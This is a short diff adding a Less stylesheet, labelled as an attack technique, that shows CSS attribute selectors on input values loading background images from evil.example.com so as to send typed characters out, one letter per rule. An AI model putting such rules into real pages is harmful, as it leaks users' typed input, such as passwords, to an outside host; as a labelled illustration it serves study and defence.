@@ -1,0 +1,10 @@
+// TTP: Using attribute selectors in Less to exfil typed characters.
+
+@baseUrl: "https://evil.example.com/exfil?char=";
+
+input[value^="a"] {
+  background: url(@{baseUrl} + "a");
+}
+input[value^="b"] {
+  background: url(@{baseUrl} + "b");
+}
